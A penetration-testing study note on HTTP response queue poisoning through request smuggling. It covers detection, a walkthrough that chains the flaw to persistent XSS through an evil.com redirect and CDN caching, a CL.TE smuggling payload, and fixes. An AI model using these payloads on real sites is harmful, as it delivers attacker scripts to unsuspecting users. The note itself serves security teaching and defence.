---
tags: [vapt, smuggling, http, critical]
difficulty: advanced
module: "26 - HTTP Request Smuggling"
topic: "26.06 Response Queue Poisoning"
---

# 26.06 — Response Queue Poisoning

## What is it?
**Response Queue Poisoning** is one of the most severe consequences of HTTP Request Smuggling. It occurs when an attacker smuggles a request, but instead of just executing an action on the backend, the attacker causes the backend to respond to the smuggled request *out of sync* with the frontend's expectations.

Because the front-end and back-end communicate over a shared, persistent TCP connection, the front-end uses a simple queue system: 
"I sent Request A, then Request B. I will hand the first response to User A, and the second response to User B."

If an attacker sends 1 request to the front-end, but the back-end sees 2 requests (carrier + smuggled), the back-end will generate 2 responses. 
The front-end receives Response 1 and gives it to the attacker.
Response 2 sits dead in the TCP queue.
When Victim B sends Request B, the back-end generates Response B.
However, the front-end sees Response 2 sitting in the queue and hands it to Victim B!

The entire queue is now desynchronized. Victim B receives the response meant for the attacker's smuggled request. Victim C receives the response meant for Victim B.

Think of it like a drive-thru. You order 1 Burger. The cook mishears and cooks 1 Burger AND 1 Pizza. The cashier hands you the Burger. You drive away. The Pizza sits on the counter. The next car pulls up and orders a Salad. The cashier grabs the first thing on the counter (the Pizza) and hands it to them. The whole line of cars is now receiving the wrong food.

## ASCII Diagram
```text
================================================================================
                        RESPONSE QUEUE POISONING
================================================================================

[Attacker sends 1 Request (Carrier + Smuggled)]
Front-End: Sends 1 stream.
Back-End : Receives Carrier Request.
Back-End : Receives Smuggled Request (e.g., GET /attacker_profile).

[Back-End generates 2 Responses]
Response A (For Carrier)
Response B (For Smuggled GET /attacker_profile)

[Front-End receives Response A]
Front-End hands Response A back to the Attacker.
*Response B sits in the Front-End queue.*

[Victim sends 1 legitimate Request]
Victim: GET /bank_statement

[Front-End grabs the next response in the queue]
Front-End hands Response B (The Attacker's Profile data) to the Victim!
(The Victim's browser caches the Attacker's profile instead of their bank statement).
================================================================================
```

## How to Find It
- **Manual steps:**
  1. You must have already established a working smuggling vulnerability (CL.TE, TE.CL, or H2).
  2. Craft a smuggled request that triggers a very distinct response (e.g., a 404 Not Found, or a 302 Redirect to a server you control).
  3. Send the smuggling payload.
  4. Immediately send a normal request (acting as the victim) from a different tab or tool.
  5. If your normal request receives the 404 or the 302 Redirect meant for the smuggled request, you have poisoned the queue.

## How to Exploit It
- **Step-by-step walkthrough:**
  Let's exploit this to achieve persistent XSS.
  1. The target application serves a JavaScript file at `GET /assets/main.js`.
  2. You find a smuggling vulnerability.
  3. You set up a malicious server: `http://evil.com/malicious.js`.
  4. You construct a smuggled request that triggers an open redirect to your server: `GET /redirect?url=http://evil.com/malicious.js`.
  5. You fire the smuggling payload. The back-end generates a 302 Redirect response and puts it in the queue.
  6. A legitimate victim navigates to the target site. Their browser requests `GET /assets/main.js`.
  7. The front-end hands the victim the 302 Redirect from the queue!
  8. The victim's browser follows the redirect, downloads `malicious.js` from your server, and executes it in the context of the target application.
  9. **Bonus:** If the victim's request was routed through a CDN cache (like Cloudflare), Cloudflare will *cache* the 302 Redirect under the key `/assets/main.js`. Now, *every* user who visits the site gets hacked, even after you stop smuggling.

- **Actual payloads:**
  **Smuggling a Redirect (CL.TE):**
  ```http
  POST / HTTP/1.1
  Host: vulnerable.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 54
  Transfer-Encoding: chunked
  
  0
  
  GET /login?redirect=http://evil.com HTTP/1.1
  X: X
  ```

## Real-World Example
James Kettle used Response Queue Poisoning against a target running an older version of HAProxy. By smuggling a request that generated a 401 Unauthorized response, he desynchronized the queue. The next legitimate user who tried to download an image file received the 401 Unauthorized response instead. More maliciously, Kettle smuggled a request that generated a large JSON payload containing an XSS vector. He timed it perfectly so that when a victim requested a specific HTML page, the front-end handed them the JSON payload containing the XSS, which executed in their browser.

## How to Fix It
- **Developer remediation:**
  1. **Disable Connection Reuse:** The only guaranteed way to stop Response Queue Poisoning if smuggling exists is to configure the front-end to close the TCP connection to the back-end after every single request (`Connection: close`). If the connection drops, the queue is destroyed, and the smuggled response is deleted before the next user connects.
  2. **Fix the Smuggling Root Cause:** Ensure end-to-end HTTP/2 or strict RFC 7230 compliance on the front-end proxy to prevent smuggling from occurring in the first place.

## Chaining Opportunities
- This vuln + [[01 - Web Cache Poisoning Basics]] → If a CDN caches the desynchronized response, you achieve Web Cache Poisoning, amplifying the attack to affect all users globally.
- This vuln + [[09 - Smuggling to Deliver XSS]] → Using queue poisoning to swap out legitimate JS files for malicious ones.

## Related Notes
- [[01 - What is HTTP Request Smuggling?]]
- [[08 - Smuggling to Capture Other Users' Requests]]
